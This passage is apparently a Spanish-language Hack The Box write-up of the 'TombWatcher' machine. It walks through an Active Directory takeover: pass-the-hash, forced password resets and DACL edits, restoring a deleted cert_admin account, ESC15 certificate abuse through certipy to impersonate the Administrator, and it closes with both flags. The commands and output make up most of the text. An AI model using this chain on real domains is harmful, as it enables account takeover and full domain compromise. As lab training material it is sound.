Veremos que ha funcionado, obtenemos el `hash NTLM` del usuario `ANSIBLE_DEV$`, vamos a comprobarlo de esta forma:

```shell
netexec smb <IP> -u 'ANSIBLE_DEV$' -H 'bf8b11e301f7ba3fdc616e5d4fa01c30' --shares
```

Info:

```
SMB         10.10.11.72     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)                                                                                                                                                        
SMB         10.10.11.72     445    DC01             [+] tombwatcher.htb\ANSIBLE_DEV$:bf8b11e301f7ba3fdc616e5d4fa01c30 
SMB         10.10.11.72     445    DC01             [*] Enumerated shares
SMB         10.10.11.72     445    DC01             Share           Permissions     Remark
SMB         10.10.11.72     445    DC01             -----           -----------     ------
SMB         10.10.11.72     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.72     445    DC01             C$                              Default share
SMB         10.10.11.72     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.72     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.11.72     445    DC01             SYSVOL          READ            Logon server share
```

Veremos que funciona, ahora que con este usuario recordemos que tenemos los privilegios para cambiar la contraseña al usuario `sam`, podremos realizar lo siguiente:

```shell
python3 bloodyAD.py --host '<IP>' -d 'tombwatcher.htb' -u 'ansible_dev$'  -p ':bf8b11e301f7ba3fdc616e5d4fa01c30' set password SAM 'P@ssw0rd123!'
```

Info:

```
[+] Password changed successfully!
```

Veremos que ha funcionado, por lo que vamos a probar las credenciales de esta forma:

```shell
netexec smb <IP> -u 'sam' -p 'P@ssw0rd123!' --shares
```

Info:

```
SMB         10.10.11.72     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.72     445    DC01             [+] tombwatcher.htb\sam:P@ssw0rd123! 
SMB         10.10.11.72     445    DC01             [*] Enumerated shares
SMB         10.10.11.72     445    DC01             Share           Permissions     Remark
SMB         10.10.11.72     445    DC01             -----           -----------     ------
SMB         10.10.11.72     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.72     445    DC01             C$                              Default share
SMB         10.10.11.72     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.72     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.11.72     445    DC01             SYSVOL          READ            Logon server share
```

Veremos que funciona, recordemos que tenemos `WriteOwner` sobre el usuario `john` que es el que se puede conectar por `WinRM` de forma remota, por lo que vamos aprovechar esto:

Vamos añadirnos todos los permisos con el usuario `sam` al objeto de usuario `john` de esta forma:

> OwnerEdit

```shell
impacket-owneredit -dc-ip <IP> -action write -new-owner sam -target john tombwatcher.htb/sam:P@ssw0rd123!
```

Info:

```
/home/kali/Desktop/tombwatcher/bloodyAD/.venv/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Current owner information below
[*] - SID: S-1-5-21-1392491010-1358638721-2126982587-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=tombwatcher,DC=htb
[*] OwnerSid modified successfully!
```

> DACLEdit

```shell
impacket-dacledit -dc-ip <IP> -action write -rights FullControl -principal sam -target john tombwatcher/sam:P@ssw0rd123!
```

Info:

```
/home/kali/Desktop/tombwatcher/bloodyAD/.venv/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20251012-073940.bak
[*] DACL modified successfully!
```

Ahora si echo todo lo anterior, ya podremos cambiarle la contraseña a `john` ya que tenemos los privilegios adecuados que nos hemos añadido.

```shell
python3 bloodyAD.py -d 'tombwatcher.htb' -u 'sam' -p 'P@ssw0rd123!' --host <IP> set password 'john' 'JohnPassword123!'
```

Info:

```
[+] Password changed successfully!
```

### Evil-winrm

Veremos que ha funcionado, vamos a probar a meternos por `WinRM` de esta forma:

```shell
evil-winrm -i <IP> -u john -p 'JohnPassword123!'
```

Info:

```
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\john\Documents> whoami
tombwatcher\john
```

Con esto ya estaremos dentro, por lo que leeremos la `flag` del usuario.

> user.txt

```
01f234e8a41cc2176519e3ff68c229b9
```

## Escalate Privileges

Despues de un rato buscando, vamos a probar una tecnica llamada `Tombstone AD` que es similar al nombre de la maquina de `HTB`, primero vamos a obtener los objetos o usuarios que estan marcados como eliminados.

```powershell
Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeDeletedObjects
```

Info:

```
Deleted           : True
DistinguishedName : CN=cert_admin\0ADEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3,CN=Deleted Objects,DC=tombwatcher,DC=htb
Name              : cert_admin
                    DEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
ObjectClass       : user
ObjectGUID        : f80369c8-96a2-4a7f-a56c-9c15edd7d1e3

Deleted           : True
DistinguishedName : CN=cert_admin\0ADEL:c1f1f0fe-df9c-494c-bf05-0679e181b358,CN=Deleted Objects,DC=tombwatcher,DC=htb
Name              : cert_admin
                    DEL:c1f1f0fe-df9c-494c-bf05-0679e181b358
ObjectClass       : user
ObjectGUID        : c1f1f0fe-df9c-494c-bf05-0679e181b358

Deleted           : True
DistinguishedName : CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb
Name              : cert_admin
                    DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
ObjectClass       : user
ObjectGUID        : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
```

Veremos que hay un usuario llamado `cert_admin` el cual es bastante interesante, vamos a probar a restaurar a dicho `usuario`.

```powershell
Get-ADObject -Filter 'sAMAccountName -eq "cert_admin"' -IncludeDeletedObjects | Sort-Object -Property whenDeleted -Descending | Select-Object -First 1 | Restore-ADObject
```

Ahora si listamos los usuarios...

```powershell
net user /domain
```

Info:

```
User accounts for \\

-------------------------------------------------------------------------------
Administrator            Alfred                   cert_admin
Guest                    Henry                    john
krbtgt                   sam
The command completed with one or more errors.
```

Veremos que se restauro de forma correcta, vamos a probar a cambiarle la contraseña a dicho usuario de esta forma:

```powershell
Set-ADAccountPassword -Identity cert_admin -NewPassword (ConvertTo-SecureString "Password123!" -AsPlainText -Force)
```

Ahora si nos vamos a otra terminal de nuestro atacante y probamos lo siguiente:

```shell
netexec smb <IP> -u cert_admin -p 'Password123!' --shares
```

Info:

```
SMB         10.10.11.72     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.72     445    DC01             [+] tombwatcher.htb\cert_admin:Password123! 
SMB         10.10.11.72     445    DC01             [*] Enumerated shares
SMB         10.10.11.72     445    DC01             Share           Permissions     Remark
SMB         10.10.11.72     445    DC01             -----           -----------     ------
SMB         10.10.11.72     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.72     445    DC01             C$                              Default share
SMB         10.10.11.72     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.72     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.11.72     445    DC01             SYSVOL          READ            Logon server share
```

Veremos que se cambio de forma correcta, si lanzamos en `PowerShell` este comando para ver la informacion de las plantillas:

```powershell
certutil -template -v
```

Veremos despues de un buen rato e investigando mucho esta plantilla de aqui:

```
WebServer (Template[31])
Allow Enroll        S-1-5-21-1392491010-1358638721-2126982587-1111
Allow Read          S-1-5-21-1392491010-1358638721-2126982587-1111
```

El `SID` del `cert_admin` es `S-1-5-21-1392491010-1358638721-2126982587-1111`, coincide con la plantilla de `WebServer`, por lo que el usuario `cert_admin` tiene permisos **Enroll** en la plantilla **WebServer**. Esto significa que puede solicitar certificados usando esa plantilla.

Si lo verificamos con un prqueño script:

```powershell
*Evil-WinRM* PS C:\Users\john\Documents> Get-ADObject -Filter * -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=tombwatcher,DC=htb" | ForEach-Object {
    $acl = Get-ACL "AD:\$($_.DistinguishedName)"
    $access = $acl.Access | Where-Object {$_.IdentityReference -like "*1111*" -or $_.IdentityReference -like "*cert_admin*"}
    if ($access) {
        Write-Host "Template: $($_.Name)" -ForegroundColor Green
        $access | Format-Table IdentityReference, ActiveDirectoryRights, AccessControlType
    }
}
```

Info:

```
Template: WebServer

IdentityReference                           ActiveDirectoryRights AccessControlType
-----------------                           --------------------- -----------------
TOMBWATCHER\cert_admin                                GenericRead             Allow
TOMBWATCHER\cert_admin ReadProperty, WriteProperty, ExtendedRight             Allow
```

Veremos que efectivamente si los tiene ya confirmado, pero antes vamos a probar tambien con una herramienta que te automatiza todo esto.

```shell
certipy-ad find -dc-ip '<IP>' -vulnerable  -u 'cert_admin' -p 'Password123!' -stdout
```

Info:

```
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'tombwatcher-CA-1' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'tombwatcher-CA-1'
[*] Checking web enrollment for CA 'tombwatcher-CA-1' @ 'DC01.tombwatcher.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : tombwatcher-CA-1
    DNS Name                            : DC01.tombwatcher.htb
    Certificate Subject                 : CN=tombwatcher-CA-1, DC=tombwatcher, DC=htb
    Certificate Serial Number           : 3428A7FC52C310B2460F8440AA8327AC
    Certificate Validity Start          : 2024-11-16 00:47:48+00:00
    Certificate Validity End            : 2123-11-16 00:57:48+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : TOMBWATCHER.HTB\Administrators
      Access Rights
        ManageCa                        : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        ManageCertificates              : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Enroll                          : TOMBWATCHER.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : WebServer
    Display Name                        : Web Server
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T17:07:26+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
    [+] User Enrollable Principals      : TOMBWATCHER.HTB\cert_admin
    [!] Vulnerabilities
      ESC15                             : Enrollee supplies subject and schema version is 1.
    [*] Remarks
      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.
```

Veremos que aqui nos muestra una mucho mejor que es la `ESC15` vemos que es vulnerable ya directamente, por lo que vamos a realizar lo siguiente para solicitar el certificado del `admin`:

```shell
certipy-ad req -u 'cert_admin@tombwatcher.htb' -p 'Password123!' -dc-ip '<IP>' -target 'DC01.tombwatcher.htb' -ca 'tombwatcher-CA-1' -template 'WebServer' -upn 'administrator@tombwatcher.htb' -application-policies 'Client Authentication'
```

Info:

```
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 5
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@tombwatcher.htb'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

Veremos que nos deja un archivo `administrator.pfx` que es el certificado del `admin`, vamos autenticarnos con dicho `certificado`:

```shell
certipy-ad auth -pfx 'administrator.pfx' -dc-ip '10.10.11.72' -ldap-shell
```

Info:

```
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@tombwatcher.htb'
[*] Connecting to 'ldaps://10.10.11.72:636'
[*] Authenticated to '10.10.11.72' as: 'u:TOMBWATCHER\\Administrator'
Type help for list of commands

# whoami
u:TOMBWATCHER\Administrator
```

Obtendremos una `shell` muy pobre, por lo que vamos a cambiarle la contraseña de esta forma:

```shell
change_password administrator P@ssw0rd!
```

Info:

```
Got User DN: CN=Administrator,CN=Users,DC=tombwatcher,DC=htb
Attempting to set new password of: P@ssw0rd!
Password changed successfully!
```

Ahora vamos a conectarnos por `WinRM` con el usuario `administrador` asi:

```shell
evil-winrm -i <IP> -u administrator -p 'P@ssw0rd!'
```

Info:

```
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
tombwatcher\administrator
```

Con esto veremos que ha funcionado y seremos el usuario `admin` por lo que leeremos la `flag` del `admin`.

> root.txt

```
502881619329503edc1a0926b2c62e45
```
